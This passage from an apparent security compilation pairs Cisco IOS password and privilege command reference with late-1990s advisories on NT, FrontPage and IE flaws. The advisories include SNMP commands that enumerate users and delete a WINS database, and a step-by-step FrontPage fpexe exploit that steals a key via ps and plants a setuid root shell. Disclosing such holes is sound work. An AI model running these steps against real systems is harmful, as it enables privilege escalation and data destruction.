You should always define either an idle timeout (with the timeout keyword in this command) or 
an absolute timeout (with the timeout keyword in the access-list command). Otherwise, the 
dynamic access list will remain, even after the user has terminated the session. 
Example
In the following example, the software enables IP access on incoming packets in which the 
source address is 172.29.1.129 and the destination address is 192.168.52.12. All other source 
and destination pairs are discarded.

[12.7.9] enable password 
Use the enable password global configuration command to set a local password to control 
access to various privilege levels. Use the no form of this command to remove the password 
requirement. 
enable password [level level] {password | encryption-type encrypted-password} 
no enable password [level level] 
Syntax Description
level level 	(Optional) Level for which the password applies. You can specify up to 16 
privilege levels, using numbers 0 through 15. Level 1 is normal EXEC-mode user privileges. If this 
argument is not specified in the command or the no form of the command, the privilege level 
defaults to 15 (traditional enable privileges). 	
password 	Password users type to enter enable mode. 	
encryption-type 	(Optional) Cisco-proprietary algorithm used to encrypt the password. Currently 
the only encryption type available is 7. If you specify encryption-type, the next argument you 
supply must be an encrypted password (a password already encrypted by a Cisco router). 	
encrypted-password 	Encrypted password you enter, copied from another router configuration. 
	
Default
No password is defined. The default is level 15. 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
Use this command with the level option to define a password for a specific privilege level. After 
you specify the level and the password, give the password to the users who need to access this 
level. Use the privilege level (global) configuration command to specify commands accessible 
at various levels. 
You will not ordinarily enter an encryption type. Typically you enter an encryption type only if you 
copy and paste into this command a password that has already been encrypted by a Cisco 
router. 
 Caution If you specify an encryption type and then enter a cleartext password, you will not 
be able to reenter enable mode. You cannot recover a lost password that has been encrypted by 
any method. 
If the service password-encryption command is set, the encrypted form of the password you 
create with the enable password command is displayed when a show startup-config command 
is entered. 
You can enable or disable password encryption with the service password-encryption 
command. 
An enable password is defined as follows: 
? Must contain from 1 to 25 uppercase and lowercase alphanumeric characters. 
? Must not have a number as the first character. 
? Can have leading spaces, but they are ignored. However, intermediate and trailing 
spaces are recognized. 
? Can contain the question mark (?) character if you precede the question mark with the 
key combination Crtl-V when you create the password; for example, to create the 
password abc?123, do the following: 
? Enter abc. 
? Type Crtl-V. 
? Enter ?123. 
When the system prompts you to enter the enable password, you need not precede the 
question mark with the Ctrl-V; you can simply enter abc?123 at the password prompt. 
Examples
In the following example, the password pswd2 is enabled for privilege level 2: 
enable password level 2 pswd2
In the following example the encrypted password $1$i5Rkls3LoyxzS8t9, which has been copied 
from a router configuration file, is set for privilege level 2 using encryption type 7: 
enable password level 2 7 $1$i5Rkls3LoyxzS8t9

[12.8.0] enable secret 
Use the enable secret global configuration command to specify an additional layer of security 
over the enable password command. Use the no form of the command to turn off the enable 
secret function. 
enable secret [level level] {password | encryption-type encrypted-password} 
no enable secret [level level] 
Syntax Description
level level 	(Optional) Level for which the password applies. You can specify up to sixteen 
privilege levels, using numbers 0 through 15. Level 1 is normal EXEC-mode user privileges. If this 
argument is not specified in the command or in the no form of the command, the privilege level 
defaults to 15 (traditional enable privileges). The same holds true for the no form of the 
command. 	
password 	Password users type to enter enable mode. This password should be different 
from the password created with the enable password command. 	
encryption-type 	(Optional) Cisco-proprietary algorithm used to encrypt the password. Currently 
the only encryption type available for this command is 5 . If you specify encryption-type, the next 
argument you supply must be an encrypted password (a password encrypted by a Cisco router). 	
encrypted-password 	Encrypted password you enter, copied from another router configuration. 
	
Default
No password is defined. The default level is 15. 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.0. 
Use this command in conjunction with the enable password command to provide an additional 
layer of security over the enable password. The enable secret command provides better security 
by storing the enable secret password using a non-reversible cryptographic function. The added 
layer of security encryption provides is useful in environments where the password crosses the 
network or is stored on a TFTP server. 
You will not ordinarily enter an encryption type. Typically you enter an encryption type only if you 
paste into this command an encrypted password that you copied from a router configuration file. 
 Caution If you specify an encryption-type and then enter a cleartext password, you will not 
be able to reenter enable mode. You cannot recover a lost password that has been encrypted by 
any method. 
If you use the same password for the enable password and enable secret commands, you 
receive an error message warning that this practice is not recommended, but the password will 
be accepted. By using the same password, however, you undermine the additional security the 
enable secret command provides. 

Note After you set a password using enable secret command, a password set using the enable 
password command works only if the enable secret is disabled or an older version of Cisco IOS 
software is being used, such as when running an older rxboot image. Additionally, you cannot 
recover a lost password that has been encrypted by any method. 

If service password-encryption is set, the encrypted form of the password you create here is 
displayed when a show startup-config command is entered. 
You can enable or disable password encryption with the service password-encryption 
command. 
An enable password is defined as follows: 
? Must contain from 1 to 25 uppercase and lowercase alphanumeric characters 
? Must not have a number as the first character 
? Can have leading spaces, but they are ignored. However, intermediate and trailing 
spaces are recognized. 
? Can contain the question mark (?) character if you precede the question mark with the 
key combination Crtl-V when you create the password; for example, to create the 
password abc?123, do the following: 
? Enter abc. 
? Type Crtl-V. 
? Enter ?123. 
When the system prompts you to enter the enable password, you need not precede the 
question mark with the Ctrl-V; you can simply enter abc?123 at the password prompt. 
Examples
The following example specifies the enable secret password of gobbledegook: 
enable secret gobbledegook
After specifying an enable secret password, users must enter this password to gain access. Any 
passwords set through enable password will no longer work. 
Password: gobbledegoo
In the following example the encrypted password $1$FaD0$Xyti5Rkls3LoyxzS8 , which has been 
copied from a router configuration file, is enabled for privilege level 2 using encryption type 5: 
enable password level 2 5 $1$FaD0$Xyti5Rkls3LoyxzS8

[12.8.2] login authentication 
To enable TACACS+ authentication for logins, use the login authentication line configuration 
command. Use the no form of this command to either disable TACACS+ authentication for logins 
or to return to the default. 
login authentication {default | list-name} 
no login authentication {default | list-name} 
Syntax Description
default 	Uses the default list created with the aaa authentication login command. 	
list-name 	Uses the indicated list created with the aaa authentication login command. 	
Default
Uses the default set with aaa authentication login. 
Command Mode
Line configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
This command is a per-line command used with AAA that specifies the name of a list of 
TACACS+ authentication methods to try at login. If no list is specified, the default list is used 
(whether or not it is specified in the command line). 
 Caution If you use a list-name value that was not configured with the aaa authentication 
login command, you will disable login on this line. 
Entering the no version of login authentication has the same effect as entering the command 
with the default argument. 
Before issuing this command, create a list of authentication processes by using the global 
configuration aaa authentication login command. 
Examples
The following example specifies that the default AAA authentication is to be used on line 4: 
line 4
login authentication default
The following example specifies that the AAA authentication list called list1 is to be used on line 
7: 
line 7

[12.8.3] privilege level (global) 
To set the privilege level for a command, use the privilege level global configuration command. 
Use the no form of this command to revert to default privileges for a given command. 
privilege mode level level command 
no privilege mode level level command 
Syntax Description
mode 	Configuration mode. (See the alias command in the Configuration Fundamentals 
Command Reference for a description of mode. 	
level 	Privilege level associated with the specified command. You can specify up to sixteen 
privilege levels, using numbers 0 through 15. 	
command 	Command to which privilege level is associated. 	
Defaults
Level 15 is the level of access permitted by the enable password. 
Level 1 is normal EXEC-mode user privileges. 
Command Mode 
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
The description of the alias command, in the Configuration Fundametals Command Reference, 
shows the options for the mode argument in the privilege level global configuration command. 
The password for a privilege level defined using the privilege level global configuration 
command is configured using the enable password command. 
Level 0 can be used to specify a more-limited subset of commands for specific users or lines. For 
example, you can allow user "guest" to use only the show users and exit commands. 

Note There are five commands associated with privilege level 0: disable, enable, exit, help, and 
logout. If you configure AAA authorization for a privilege level greater than 0, these five 
commands will not be included. 

When you set a command to a privilege level, all commands whose syntax is a subset of that 
command are also set to that level. For example, if you set the show ip route command to level 
15, the show commands and show ip commands are automatically set to privilege level 15---
unless you set them individually to different levels. 
Example
The commands in the following example set the configure command to privilege level 14 and 
establish SecretPswd14 as the password users must enter to use level 14 commands. 
privilege exec level 14 configure
enable secret level 14 SecretPswd14

To set the default privilege level for a line, use the privilege level line configuration command. 
Use the no form of this command to restore the default user privilege level to the line. 
privilege level level 
no privilege level 
Syntax Description
level 	Privilege level associated with the specified line. 	
Defaults
Level 15 is the level of access permitted by the enable password. 
Level 1 is normal EXEC-mode user privileges. 
Command Mode 
Line configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
Users can override the privilege level you set using this command by logging in to the line and 
enabling a different privilege level. They can lower the privilege level by using the disable 
command. If users know the password to a higher privilege level, they can use that password to 
enable the higher privilege level. 
You can use level 0 to specify a subset of commands for specific users or lines. For example, you 
can allow user "guest" to use only the show users and exit commands. 
You might specify a high level of privilege for your console line to restrict who uses the line. 
Examples
The commands in the following example configure the auxiliary line for privilege level 5. Anyone 
using the auxiliary line has privilege level 5 by default. 
line aux 0
privilege level 5
The command in the following example sets all show ip commands, which includes all show 
commands, to privilege level 7: 
privilege exec level 7 show ip route
This is equivalent to the following command: 
privilege exec level 7 show

The commands in the following example set show ip route to level 7 and the show and show ip 
commands to level 1: 
privilege exec level 7 show ip route
privilege exec level 1 show ip

[12.8.5] service password-encryption 
To encrypt passwords, use the service password-encryption global configuration command. 
Use the no form of this command to disable this service. 
service password-encryption 
no service password-encryption 
Syntax Description
This command has no arguments or keywords. 
Default
No encryption 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
The actual encryption process occurs when the current configuration is written or when a 
password is configured. Password encryption is applied to all passwords, including authentication 
key passwords, the privileged command password, console and virtual terminal line access 
passwords, and BGP neighbor passwords. This command is primarily useful for keeping 
unauthorized individuals from viewing your password in your configuration file. 
When password encryption is enabled, the encrypted form of the passwords is displayed when a 
show startup-config command is entered. Caution This command does not provide a high level 
of network security. If you use this command, you should also take additional network security 
measures. 

Note You cannot recover a lost encrypted password. You must clear NVRAM and set a new 
password.

[12.8.7] username 
To establish a username-based authentication system, enter the username global configuration 
command. 
username name {nopassword | password password [encryption-type encrypted-password]} 
username name password secret 
username name [access-class number] 
username name [autocommand command] 
username name [callback-dialstring telephone-number] 
username name [callback-rotary rotary-group-number] 
username name [callback-line [tty] line-number [ending-line-number]] 
username name [nocallback-verify] 
username name [noescape] [nohangup] 
username name [privilege level] 
Syntax Description
name 	Host name, server name, user ID, or command name. The name argument can be only 
one word. White spaces and quotation marks are not allowed. 	
nopassword 	No password is required for this user to log in. This is usually most useful in 
combination with the autocommand keyword. 	
password 	Specifies a possibly encrypted password for this username. 	
password 	Password a user enters. 	
encryption-type 	(Optional) Single-digit number that defines whether the text immediately following 
is encrypted, and, if so, what type of encryption is used. Currently defined encryption types are 0, 
which means that the text immediately following is not encrypted, and 7, which means that the 
text is encrypted using a Cisco-defined encryption algorithm. 	
encrypted password 	Encrypted password a user enters. 	
password 	(Optional) Password to access the name argument. A password must be from 1 
to 25 characters, can contain embedded spaces, and must be the last option specified in the 
username command. 	
secret 	For CHAP authentication: specifies the secret for the local router or the remote device. 
The secret is encrypted when it is stored on the local router. The secret can consist of any string 
of up to 11 ASCII characters. There is no limit to the number of username and password 
combinations that can be specified, allowing any number of remote devices to be authenticated. 	
access-class 	(Optional) Specifies an outgoing access list that overrides the access list 
specified in the access-class line configuration command. It is used for the duration of the user's 
session. 	
number 	Access list number. 	
autocommand 	(Optional) Causes the specified command to be issued automatically after the 
user logs in. When the command is complete, the session is terminated. Because the command 
can be any length and contain embedded spaces, commands using the autocommand keyword 
must be the last option on the line. 	
command 	The command string. Because the command can be any length and contain 
embedded spaces, commands using the autocommand keyword must be the last option on the 
line. 	
callback-dialstring 	(Optional) For asynchronous callback only: permits you to specify a 
telephone number to pass to the DCE device. 	
telephone-number 	For asynchronous callback only: telephone number to pass to the DCE 
device. 	
callback-rotary 	(Optional) For asynchronous callback only: permits you to specify a 
rotary group number. The next available line in the rotary group is selected. 	
rotary-group-number 	For asynchronous callback only: integer between 1 and 100 that 
identifies the group of lines on which you want to enable a specific username for callback. 	
callback-line 	(Optional) For asynchronous callback only: specific line on which you enable a 
specific username for callback. 	
tty 	(Optional) For asynchronous callback only: standard asynchronous line. 	
line-number 	For asynchronous callback only: relative number of the terminal line (or the first 
line in a contiguous group) on which you want to enable a specific username for callback. 
Numbering begins with zero. 	
ending-line-number 	(Optional) Relative number of the last line in a contiguous group on 
which you want to enable a specific username for callback. If you omit the keyword (such as tty), 
then line-number and ending-line-number are absolute rather than relative line numbers. 	
nocallback-verify 	(Optional) Authentication not required for EXEC callback on the specified 
line. 	
noescape 	(Optional) Prevents a user from using an escape character on the host to which 
that user is connected. 	
nohangup 	(Optional) Prevents the security server from disconnecting the user after an 
automatic command (set up with the autocommand keyword) has completed. Instead, the user 
gets another login prompt. 	
privilege 	(Optional) Sets the privilege level for the user. 	
level 	(Optional) Number between 0 and 15 that specifies the privilege level for the user. 	
Default
None 
Command Mode
Global configuration 
Usage Guidelines
The following commands first appeared in Cisco IOS Release 10.0: 
username name {nopassword | password password [encryption-type encrypted-password]} 
username name password secret 
username name [access-class number] 
username name [autocommand command] 
username name [noescape] [nohangup] 
username name [privilege level] 
The following commands first appeared in Cisco IOS Release 11.1: 
username name [callback-dialstring telephone-number] 
username name [callback-rotary rotary-group-number] 
username name [callback-line [tty] line-number [ending-line-number]] 
username name [nocallback-verify] 
The username command provides username and/or password authentication for login purposes 
only. (Note that it does not provide username and/or password authentication for enable mode 
when the enable use-tacacs command is also configured.) 
Multiple username commands can be used to specify options for a single user. 
Add a username entry for each remote system that the local router communicates with and 
requires authentication from. The remote device must have a username entry for the local router. 
This entry must have the same password as the local router's entry for that remote device. 
This command can be useful for defining usernames that get special treatment. For example, you 
can use this command to define an "info" username that does not require a password, but 
connects the user to a general purpose information service. 
The username command is required as part of the configuration for the Challenge Handshake 
Authentication Protocol (CHAP). Add a username entry or each remote system the local router 
requires authentication from. 

Note To enable the local router to respond to remote CHAP challenges, one username name 
entry must be the same as the hostname name entry that has already been assigned to your 
router. 

If there is no secret specified and the debug serial-interface command is enabled, an error is 
displayed when a link is established and the CHAP challenge is not implemented. CHAP 
debugging information is available using the debug serial-interface and debug serial-packet 
commands. For more information about debug commands, refer to the Debug Command 
Reference. 
Examples
To implement a service similar to the UNIX who command, which can be entered at the login 
prompt and lists the current users of the router, the username command takes the following form: 

username who nopassword nohangup autocommand show users
To implement an information service that does not require a password to be used, the command 
takes the following form: 
username info nopassword noescape autocommand telnet nic.ddn.mil
To implement an ID that works even if the TACACS servers all break, the command takes the 
following form: 
username superuser password superpassword
The following example configuration enables CHAP on interface serial 0. It also defines a 
password for the local server, Adam, and a remote server, Eve. 
hostname Adam

interface serial 0

encapsulation ppp

ppp authentication chap

username Adam password oursystem

username Eve password theirsystem

When you look at your configuration file, the passwords will be encrypted and the display will look 
similar to the following: 
hostname Adam

interface serial 0

encapsulation ppp

ppp authentication chap

username Adam password 7 1514040356

username Eve password 7 121F0A18

[13.0.0] Known NT/95/IE Holes

[13.0.1] WINS port 84

Found by NeonSurge (rhino9 team)

This is not a critical bug. Its actually more of a nuissance than anything else. If you telnet or 
stream data to port84 of an NT server, it will cause an error to be recorded in the event long. In 
some systems, this can cause the hard drive to completely fill up with error messages, causing 
other applications to fail due to lack of drive space. The flaw will also cause the server to respond 
extremely slow.

For the telnet attack, simply telnet to the WINS port on an NT server and type on garbage 
characters, hit enter and it will cause the event log entry.

The same effect was achieved by using an application called pepsi to stream UDP informaiton to 
the same port.

[13.0.2] WindowsNT and SNMP

Found by Christopher Rouland (from ntsecurity.net)

Christopher writes:

I have found two significant "features" in the SNMP agent implementations under NT 4.0 Server, 
and I am sure there are more if I feel like really digging. The first issue I sent in earlier this year to 
Microsoft and received no response other than "expected behavior" and the second I just found 
and puts any large NT shop at a serious denial of service (DOS) risk.

1. This first exploit demonstrates the ability via SNMP to dump a list of all usernames in an NT 
domain (assuming the target box is a DC) or on an NT Server.
Here is the simplest NT example I could find to use this:
C:\NTRESKIT>snmputil walk public .1.3.6.1.4.1.77.1.2.25
should be a domain controller or server
2.The second exploit demonstrates the ability via SNMP to delete all of the records in a WINS 
database remotely, bypassing all NT security. If you understand large scale WINS 
architecture, you can understand the implications of this. Knowledge of SNMP community 
strings would allow an attacker to effectively shut down any large NT infrastructure with "N" 
commands (N=number of WINS servers). This is permitted due to the extensive "cmd" set 
implemented in the WINS extension agent, specifically:

2. cmdDeleteWins OBJECT-TYPE
SYNTAX IpAddress
ACCESS read-write
STATUS mandatory
DESCRIPTION
"This variable when set will cause all information pertaining to a WINS (data records, context 
information to be deleted from the local WINS. Use this only when owner-address mapping 
tables getting to near capacity. NOTE: deletion of all information pertaining to the managed 
WINS is not permitted"
::= { cmd 3 }
Since the SNMP toolset implemented under NT will not do snmp-set-requests, my sample 
exploit was done using the CMU SNMP development kit under Unix. The command 
"rnjdev02:~/cmu$ snmpset -v 1 192.178.16.2 public .1.3.6.1.4.1.311.1.2.5.3.0 a 
192.178.16.2" successfully entirely deleted my WINS database.

3. It appears that there are several other pieces of the LMMIB2 definition that allow for things 
such as remote session deletion or disconnect, etc, but I have not yet looked into them.

4. Stopping the Problem:
The simplest fix is to disable SNMP, or to remove the extension agents through the SNMP 
configuration in the registry.
If you MUST use SNMP, then at least block inbound access to that port. Be aware that using 
NT's various SNMP agents, a malicious intruder could gain knowledge about your entire 
network. In fact, they could quite easily gain everything they need to enter your network, 
except a password -- and those come in due time. BEWARE.

Change History
Sat Oct 11 1997: Initial posting of web page
Wed Oct 15 1997: Microsoft posted a note responding to the issues raised. I am glad to see that 
they have plans to release the source of the revised version for review when it is complete. I will 
update this page with further comments when the fixed version is released.
Wed Oct 22 1997: Microsoft has released a new version of the extensions that claim to fix the 
security issues. I will comment further on the security of their proposed fix after I have time to 
review the changes. Check back here in a few days for my comments.
Introduction
The information below talks about using Microsoft's FrontPage 98 extensions with Apache on 
Unix with Microsoft's mod_frontpage changes. This do not apply to running it on any other server 
or to running it on Unix without the Microsoft mod_frontpage changes or to running it on Windows 
NT. There are, however, other security issues on such servers, some of which are similar to 
those in the FrontPage 97 extensions. I should also note that the Unix server extensions seem to 
be written in part or completely by Ready-to-Run Software Inc. (RTR) for Microsoft. I will refer to it 
as Microsoft's product because it is, no matter who wrote it. This discussion is specific to the 
FrontPage 98 extensions. For more general information on some security problems in earlier 
versions, some of which are resolved and some of which aren't, see Scott Fritchie's Why I Don't 
Like Microsoft's FrontPage Web Authoring Tool web page. Parts of it are no longer entirely 
relevant, but it provides a good background.
It is no secret that the security of the FrontPage 97 and earlier Unix server extensions is quite 
poor, if Microsoft's instructions are followed. Some of their instructions were quite hilarious when 
first released, like the suggestion of running your web server as root. It is possible to make them 
more acceptable--acceptable enough for some sites--but it requires careful work by the 
administrator.
It had appeared like Microsoft had increased the security of the extensions in the FP98 version 
available from Microsoft's Web Site. However, a closer examination reveals startling flaws. What 
they have done is make a small setuid root wrapper that the web server calls. This wrapper than 
setuid()s to the appropriate user and runs the requested FP CGI as that user. The problem lies in 
the fact that the wrapper ("fpexe") is written very poorly. while making such a wrapper secure can 
be difficult, the gaping holes in this program show a complete lack of understanding of security in 
the Unix environment.
The fpexe program is available for you to inspect yourself. It was originally posted in RTR's 
FrontPage FAQ. This version is not exactly the same as the one currently distributed (at least it is 
not the same as the one in the BSD/OS 2.1 kit), but it is close. Both appear to exhibit the same 
failings.
When I refer to the FP CGI programs, I am referring to the three files normally referenced under 
the _vti_bin directory: shtml.exe, admin.exe and author.exe.
The key in this discussion is the fact that nothing is stopping anyone from trying to run this fpexe 
wrapper. If they can trick it into running, they can possible gain privileges they shouldn't.
How It Works
Before you can understand the holes in the FP server extensions, you need to understand what I 
mean when I talk about the "key". When the Frontpage-modified Apache server starts up, it 
generates a pseudo-random string of 128 ASCII characters as a key. This key is written to a file 
that is only readable by the user that starts Apache; normally root. The server than passes the 
key to fpexe. Since fpexe is setuid root, it can compare the key stored on disk with the one it was 
passed to be sure they match; if not, it refuses to run. This is used in an attempt to guarantee that 
the only thing calling fpexe is the web server. Used properly this is a powerful part of possible 
security precautions. I am not convinced that the generation of the key is cryptographically 
adequate and it may be subject to intelligent guessing attacks, however I have not looked at it to 
see. As discussed later, the cryptographical robustness of the key doesn't really matter.
There are a number of problems with the setuid root fpexe program. I am not attempting a 
complete description of all the problems and their possible consequences and fixes, just making a 
light sweep over the top. The more obvious problems include:
Return codes from library calls are not properly checked. An example:
f = fopen( buf, "r");
fgets( key, 129, f );
fclose(f);
If fopen() failed (easy to make it do so with ulimit -n), then if your system did not core dump on a 
fgets() on a closed descriptor you would end up with an empty key. It is obviously easy to guess 
an empty key. I am not aware of any systems that exhibit this exact problem, but it is possible. 
Return codes need to be checked, especially in setuid programs.
Proper bounds checking is not done. This leads to obvious buffer overflows. An example:
strcpy( work, FPDIR );
strcat( work, getenv("FPEXE") );
I won't go into the details of what this does, but if you could cause this code to be executed, you 
could insert your own code on most systems and likely gain access to the UID the program is 
running as (root). This proves to be an unnecessary effort to go to, because this code is only 
executed if you have the correct key; if you have the correct key, there are far easier ways to gain 
access. Buffer overflows are one of the most popular (albeit normally boring) types of new holes 
in programs being publicized.
It does not clean the environment variables before starting the CGI. Again, this means you can 
gain access to the UID that the program runs as (not root). If the rest of the program was securely 
written, this could possibly be an issue however it is of little consequence currently due to the 
gaping holes in other areas.
It assumes that if you have the key, then you are authorized to have it run any program as nearly 
any user you tell it to. The process you are running also needs to be in the same process group 
as the web server; all CGIs run by the server, however, are in the same process group so if you 
can run a CGI script you can work around the second check. It does no further checks to be sure 
you are running as a user that should be allowed to run FrontPage CGIs (other than disallowing 
UID 0; the compiled version also disallows gid 0, however the source version doesn't) or that you 
are running a Frontpage related program. This means that if you get the key file, you can gain 
access to any non-root UID on the server. On 99% of boxes, that will give you root. For example, 
if binaries are owned by bin then become bin and replace one that is run by root from cron. The 
possibilities are endless once you obtain this level of access.
And, finally, the worst: it passes the key to fpexe via an environment variable! On most systems, 
environment variables are available via "ps -e". This means that anyone with access to run 
programs on the system (and there are often more people than you think that are able to do this, 
due to things such as CGIs) can see it as it is being passed from the web server to fpexe. Recall 
that once you have the key, there is little remaining before you can get full access to the system.
Demonstration
By now, it should be obvious that there is a serious security problem in the FrontPage 98 server 
extensions. Here is one demonstration; do not think that this is the only way or that just because 
you prevent one step of this process from working it is any more difficult to exploit the security 
holes.
First I have to find the key. This can be done by using ps to get the environment from fpexe. To 
do this, I first setup a loop running (this assumes a real aka. Bourne shell; if you use the bastard 
C-shell it obviously won't work as written):
while true; do ps axuwwe -U nobody | grep FPKEY; done
Then I used ZeusBench, a very simple HTTP benchmark program, to generate load on the 
server:
zb localhost /fp/_vti_bin/shtml.exe -c 50 -t 30
Any method of generating traffic could be used, including a web browser. Since I am using a very 
inefficient method of looking for a process, I need to generate lots of traffic to increase my chance 
of finding one. It certainly isn't likely to happen on the first request. The requests do have to be 
made to a FP CGI script so it will call fpexe.
Before long, I had what I wanted from ps (manually wrapped):
nobody 28008 0.0 0.2 180 76 ?? DN 6:51PM 0:00.01
SCRIPT_URL=/fp/ SCRIPT_URI=http://localhost/fp/ FPUID=1000 FPGID=1000
FPEXE=/_vti_bin/shtml.exe FPKEY=9AF675E332F7583776C241A4795FE387D8E5DC80E77
3FAB70794848FDEFB173FF14CDCDC44F3FAAF144A8C95A81C04BF5FC2B9EFDE3C8DCA1
049CD
F760364E59 HTTP_USER_AGENT=ZeusBench/1.0 HTTP_ACCEPT=*/*
PATH=/sbin:/usr/sbin:/bin:/usr/local/bin:/usr/bin:/usr/local/sbin/
SERVER_SOFTWARE=Apache/1.2.5-dev SERVER_NAME=localhost SERVER_PORT=80
REMOTE_HOST=localhost REMOTE_ADDR=127.0.0.1
DOCUMENT_ROOT=/usr/local/etc/httpd/htdocs SERVER_ADMIN=marcs@znep.com

REQUEST_METHOD=GET QUERY_STRING= REQUEST_URI=/fp/_vti_bin/shtml.exe
SCRIPT_NAME=/fp/_vti_bin/shtml.exe fpexe
Then I need to use the key to make fpexe think I am the web server. I can't just run this from a 
normal shell, since I need to be in the same process group as the web server. A simple CGI 
suffices:
#!/bin/sh
echo Content-type: text/plain
echo
export FPUID=3;
export FPGID=3;
export FPEXE=../../../../../../../../tmp/gotcha;
export 
FPKEY=9AF675E332F7583776C241A4795FE387D8E5DC80E773FAB70794848FDEFB173
FF14CDCDC44F3FAAF144A8C95A81C04BF5FC2B9EFDE3C8DCA1049CDF760364E59
/usr/local/frontpage/currentversion/apache-fp/_vti_bin/fpexe 2>&1

I need a program for it to run (/tmp/gotcha in this example):
#!/bin/sh
/usr/bin/id
cp /bin/sh /tmp/.mysh
chmod u+s /tmp/.mysh
Then I simply make a HTTP request for the CGI script. I can then run /tmp/.mysh at my leisure to 
gain access to UID 3 (bin on my system) and do what I want from there.
Stopping the Problem:
Load the new extensions from here. So now you want to fix it. Well. That's the hard part. The only 
real solution is for someone (either Microsoft or a third party) to do some work to improve the 
security. It is possible to do this securely. Microsoft hasn't. They have no excuse. This page will 
be updated when (if?) better fixes become available.
The Apache web server has a suEXEC wrapper designed to allow for a similar thing; that is, 
execution of CGI scripts under a user's own UID. It is very restrictive (some would say anal) 
about what it allows: there is a reason for that, as Microsoft's obviously failed attempt at security 
shows. It is possible that suEXEC could be adapted to function in conjunction with FrontPage, 
however it will not work without source modifications.
One short term workaround until Microsoft addresses the issue is to simply remove the 
FrontPage setup from your system. This can be done temporarily by removing the setuid bit from 
fpexe (ie. chmod u-s fpexe). This will prevent all the pretty FrontPage CGIs from working. It will 
prevent people from uploading new pages using FrontPage's own methods (ie. they can tell 
FrontPage to use FTP and they will still be uploaded), but generic content that doesn't rely on 
FrontPage's server side CGI scripts should work fine.
Another possible workaround is to prevent users from running the ps command. This could have 
a very negative impact on your system if things depend on it, and is a poor solution however it 
may be the best one for you. On systems that don't use a procfs (/proc) based ps, you can 
normally simply remove world execute permissions from it to disable it. If you are on a system like 
Linux that normally uses a procfs for ps to get information, this doesn't solve the problem 
because someone can read from the procfs directly.
Last of all, since this problem only occurs when using FrontPage with the mod_frontpage 
extensions, it is possible to use the FrontPage extensions on Apache without using 
mod_frontpage or fpexe. Unfortunately, this conversion is not easy. It means that, after 
recompiling Apache without any of the Microsoft modifications (just commenting out 
mod_frontpage from the Configuration file may be enough; haven't checked) you have to either 
manually copy the FrontPage CGIs to the appropriate subdirectory under each user's web 
directory and make them setuid to that user or copy them (or make links) and don't make them 
setuid to that user. The former preserves the current ownership. With the latter all the user's web 
files will need to be changed back to being owned by the user the web server runs as or else they 
will be unable to manipulate them and some of the FP CGIs won't run correctly. This is a pain and 
brings you back to the horrible security practice of letting anyone who can run CGIs modify any 
FrontPage user's files. Although this may be the best temporary workaround (although quite 
annoying if you have a large number of users), I can not go into step by step details of how to 
accomplish this change because I am not fully familiar with various ways of using the FrontPage 
extensions. The Microsoft FP security considerations document (part of the FP98 Server 
Extensions Resource Kit) provides some more details of the method in which the CGIs are run 
without fpexe.
Comments:
This sort of continued disregard for security is unacceptable and inexcusable. It does not take 
significant knowledge to know that some of the things being done are flawed. If internal expertise 
is not available, an external consultant should be hired for a security review of any critical code 
such as fpexe. This is not rocket science nor is it particularily advanced programming. Nothing 
that I have described above is complicated or new. Code reviews are common practice in many 
companies and serve good purpose.
Once Microsoft fixes their glaring holes, assuming they do, I would suggest you should consider if 
you want to run their FrontPage extensions at all. Even though, once fpexe is properly fixed, you 
only risk the accounts of users using FrontPage (since that is who the FrontPage CGI scripts run 
as), that can be a significant risk. It is very possible that when someone gets bored they will find a 
hole in the FrontPage CGI scripts that gives them user level access to your system. And 
Microsoft doesn't (and isn't likely to in the future, if their past is any indication) give the source to 
those. Microsoft's own source speaks better for itself than anyone else ever could.
I have this nagging feeling that this will result in Microsoft coming out with a "fixed" version and 
not releasing the source to it at all. After all, it was only after the source came out that these flaws 
became a problem. Right? Wrong. This was a gaping hole waiting to be discovered. It would have 
almost certainly been discovered sooner or later regardless of source availability; better sooner 
than later. I certainly hope that Microsoft doesn't think the lesson in this is that source should not 
be released. It is insecure with or without the source. The FrontPage server extensions aren't 
going to find their way anywhere near any machines I control any time soon because I have no 
trust in the company behind them.
On a side note, Microsoft actually modifies the server name returned to clients when the 
FrontPage patches are installed in Apache to include "FrontPage/x.x.x". That is fine, however it 
gives anyone connecting to your server the ability to determine the chances of them being able to 
break into your system using holes in the FP server extensions.

[13.0.4] TCP/IP Flooding with Smurf

Found by TFreak (from ntsecurity.net)

The Problem
The smurf attack is quite simple. It has a list of broadcast addresses which it stores into an array, 
and sends a spoofed ICMP echo request to each of those addresses in series and starts again. 
The result is a devistating attack upon the spoofed IP. Depending on the amount of broadcast 
addresses used, many, many computers may respond to the echo request.
This attack can EASILY saturate a T1 circuit, rendering it completely useless.
HERE IS THE SMURF SOURCE CODE:

[13.0.5] SLMail Security Problem

Found by David LeBlanc (from ntsecurity.net)

David LeBlanc writes:
Version 2.5 (current version) is vulnerable to a buffer overrun attack on the POP3 service. If the 
username supplied is too long, the service will fail with a memory exception. To the best of our 
knowledge, there are no current exploits which can cause remote execution, but given the 
characteristics of the failure, it seems entirely possible that this could occur. At the very least, it 
constitutes a denial of service which will require rebooting the server if attacked. We notified 
Seattle Lab of this problem two months ago, and they did not seem to understand the severity of 
the problem.
Stopping the Problem:
Upgrade to version 2.6

[13.0.6] IE 4.0 and DHTML

Found by Ralf Hueskes (ntsecurity.net)

The Problem
A dangerous security hole in Internet Explorer 4.0 was detected by Ralf Hueskes of Jabadoo 
Communications when he conducted a series of security tests for C'T computer magazine.
His tests revealed that it is possible to spy on the contents of any text and HTML files on 
somebody else's computer. Not only local files are in danger, but also data on your company's 
intranet - even if it is protected by a firewall.
The security hole exists even if users have activated the highest security level in their browser. 
The problem affects both the German and the English version of the Internet Explorer.
The code needed for infiltrating your files can be hidden in any normal Web page or in an e-mail 
message.
Technical Details
The spy pages make use of JScript. If a user accesses a page or receives an e-mail containing 
this code, infiltration begins ...
The spy page contains a so-called IFRAME sized 1 by 1 pixel. When a user accesses the page or 
opens the e-mail message, a small Jscript program loads the HTML or text file to be spied on into 
this frame. The contents of the frame can then be read using Dynamic HTML and sent as a 
parameter hidden in a URL to any Web server in the Internet.
Protective Measures
